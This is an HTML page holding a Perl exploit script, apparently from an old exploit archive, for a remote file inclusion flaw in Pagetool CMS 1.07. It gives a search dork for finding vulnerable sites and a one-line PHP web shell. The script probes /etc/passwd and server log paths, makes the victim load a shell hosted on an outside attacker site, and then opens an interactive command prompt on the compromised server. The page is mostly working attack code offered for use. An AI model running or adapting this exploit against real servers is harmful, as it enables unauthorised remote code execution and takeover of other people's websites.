<html><head><title>Pagetool CMS <= 1.07 (pt_upload.php) Remote File Include Vulnerability</title></head><pre>#!usr/bin/perl
use LWP::UserAgent;
####################################################################
#          ___   ___                         _
#         / _ \ / _ \                       | |
#     __ _| | | | | | |_ __  ___   _ __   ___| |_
#   / _` | | | | | | | '_ \/ __| | '_ \ / _ \ __|
#  | (_| | |_| | |_| | | | \__ \_| | | |  __/ |_
#   \__, |\___/ \___/|_| |_|___(_)_| |_|\___|\__|
#    __/ |
#   |___/
#
#===========================INFO====================================
# Impact level: HIGH
#
# Google: powered by pagetool or Pagetool Development Team
#
# browser use:
# http://[ site ]/src/admin/pt_upload.php?config_file=[local server file]&amp;ptconf[src]=[ shell ]?
#
#=========================VULN CODE=================================
# Code:
#
# if (file_exists($config_file))
#{
#     include($config_file);
#
#    ...
#      include($ptconf[&quot;src&quot;] . &quot;pagetool/pt_profile.inc&quot;);
#      include($ptconf[&quot;src&quot;] . &quot;pagetool/pt_functions.inc&quot;);
#===================================================================
#
#  Vulnerability Found by: FiSh and godXcel
#
#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
                    #---Exploit---#
#==========================================================#
#         [Pagetool CMS &lt;=1.07 (RFI)]
#    [c]oded by TrinTiTTy -at- g00ns.net
#==========================================================#
#
#    ! Vulnerability by FiSh and godXcel !
#
# Shoutz: z3r0, clorox, wicked, synical, ReZEN, grumpy,
#         SiCK, and everyone else at g00ns.net
#
#    greetz: 13337.org, acircle.us
#
# www.g00ns.net | irc.g00ns.net #g00ns | www.g00ns-forum.net
#
#      #=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
#      # Notes:                                     #
#      # Shell example &lt;?passthru($_GET[cmd]);?&gt;    #
#      # Shell variable: ($_GET[cmd]);              #
#      #=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
#==========================================================#

$host = @ARGV[0]; $shell = @ARGV[1];

if ($host =~ /http:\/\// || $shell =~ /http:\/\//)
   {print &quot;\n\n [-] Don't include http:// in your links!\n&quot;;usage();exit();}
elsif (@ARGV != 2) {head();usage();exit();}
head();
print &quot;\n [!] Scanning for local server config file\n\n [!] Be patient...\n&quot;;

# No credz to me for below list..
@cfgs = (&quot;/etc/passwd&quot;,
         &quot;../apache/logs/error.log&quot;,
         &quot;../../../../apache/logs/access.log&quot;,
         &quot;../apache/logs/access.log&quot;,
         &quot;../../../../../var/log/httpd/error_log&quot;,
         &quot;../../apache/logs/error.log&quot;,
         &quot;../../apache/logs/access.log&quot;,
         &quot;../../../apache/logs/error.log&quot;,
         &quot;../../../apache/logs/access.log&quot;,
         &quot;../../../../apache/logs/error.log&quot;,
         &quot;../../../../../apache/logs/error.log&quot;,
         &quot;../../../../../apache/logs/access.log&quot;,
         &quot;../logs/error.log&quot;,
         &quot;../logs/access.log&quot;,
         &quot;../../logs/error.log&quot;,
         &quot;../../logs/access.log&quot;,
         &quot;../../../logs/error.log&quot;,
         &quot;../../../logs/access.log&quot;,
         &quot;../../../../logs/error.log&quot;,
         &quot;../../../../logs/access.log&quot;,
         &quot;../../../../../logs/error.log&quot;,
         &quot;../../../../../logs/access.log&quot;,
         &quot;../../../../../etc/httpd/logs/access_log&quot;,
         &quot;../../../../../etc/httpd/logs/access.log&quot;,
         &quot;../../../../../etc/httpd/logs/error_log&quot;,
         &quot;../../../../../etc/httpd/logs/error.log&quot;,
         &quot;../../../../../var/www/logs/access_log&quot;,
         &quot;../../../../../var/www/logs/access.log&quot;,
         &quot;../../../../../usr/local/apache/logs/access_log&quot;,
         &quot;../../../../../usr/local/apache/logs/access.log&quot;,
         &quot;../../../../../var/log/apache/access_log&quot;,
         &quot;../../../../../var/log/apache/access.log&quot;,
         &quot;../../../../../var/log/access_log&quot;,
         &quot;../../../../../var/www/logs/error_log&quot;,
         &quot;../../../../../var/www/logs/error.log&quot;,
         &quot;../../../../../usr/local/apache/logs/error_log&quot;,
         &quot;../../../../../usr/local/apache/logs/error.log&quot;,
         &quot;../../../../../var/log/apache/error_log&quot;,
         &quot;../../../../../var/log/apache/error.log&quot;,
         &quot;../../../../../var/log/access_log&quot;,
         &quot;../../../../../var/log/error_log&quot;);
scan();
sub scan(){
  for ($i = 0; $i &lt;=40; ++$i){
  $ag3nt = LWP::UserAgent-&gt;new() || die;
  $inc = &quot;http://&quot;.$host.&quot;/src/admin/pt_upload.php?config_file=&quot;.$cfgs[$i].&quot;&amp;ptconf[src]=http://&quot;.$shell.&quot;?&quot;;
  $response = $ag3nt-&gt;get($inc);
  syswrite STDOUT,&quot;.&quot;;
  $ans = $response-&gt;content;
    if( $ans =~ /500 Server closed connection without sending any data back/)
       {print &quot;\n\n [-] Couldn't Include Shell...better luck next time.\n\n&quot;;exit;}
    elsif ($ans =~ /Cannot execute a blank command/)
       {print &quot;\n [+] Server File: FOUND\n\n [+] Executing Command Shell...\n\nType quit to exit shell\n&quot;;commands();}}}
print &quot;\n\n [-] Couldn't find valid config file...better luck next time\n\n&quot;;exit;

sub commands(){
print &quot;\nshell\@box \$~ &quot;;
  $nix=&lt;STDIN&gt;;
  chomp($nix);
if ($nix =~ /quit/gmi){print &quot;\n [-] Good Bye\n&quot;;exit();}
$ag3nt = LWP::UserAgent-&gt;new() || die;
$inc = &quot;http://&quot;.$host.&quot;/src/admin/pt_upload.php?config_file=&quot;.$cfgs[$i].&quot;&amp;ptconf[src]=http://&quot;.$shell.&quot;?cmd=&quot;.$nix.'%00';
$response = $ag3nt-&gt;get($inc);
$ans = $response-&gt;content;
if ($ans =~ /&lt;b&gt;Warning&lt;\/b&gt;:/gmi || $ans =~ /&lt;a href=/gmi)
   {print &quot; \n[-] ERROR: Bad command, permissions, website, or shell.\n&quot;;commands();}
else {print &quot;\n$ans&quot;;commands();}}

sub head(){
 print q {
   |======================================================|
   |               Pagetool CMS &lt;=1.07 (RFI)              |
   |         [c]oded by TrinTiTTy -at- g00ns.net          |
   | -----------------------------------------------------|
   |                                                      |
   |          Vulnerability by FiSh and godXcel           |
   |            greetz: 13337.org, acircle.us             |
   |                                                      |
   |                   www.g00ns.net                      |
   |======================================================|
   }}
sub usage(){
 print q{
 Usage: perl pagetool07.pl &lt;host&gt; &lt;shell location&gt;

 Example: perl pagetool07.pl www.victim.net www.shellsite.com/shell.txt
   }
 }

# milw0rm.com [2006-12-24]</pre></html>